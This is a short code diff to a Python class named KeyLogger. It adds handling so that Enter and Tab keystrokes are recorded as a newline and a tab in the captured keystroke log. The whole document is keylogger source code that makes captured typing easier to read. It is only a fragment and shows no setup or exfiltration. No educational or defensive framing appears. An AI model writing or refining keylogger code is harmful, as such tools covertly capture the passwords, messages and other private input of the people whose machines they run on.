@@ -17,5 +17,9 @@ class KeyLogger:
         except AttributeError:
             if key == keyboard.Key.space:
                 self.logger += " "
+            elif key == keyboard.Key.enter:
+                self.logger += "\n"
+            elif key == keyboard.Key.tab:
+                self.logger += "\t"
             else:
                 self.logger += str(key)
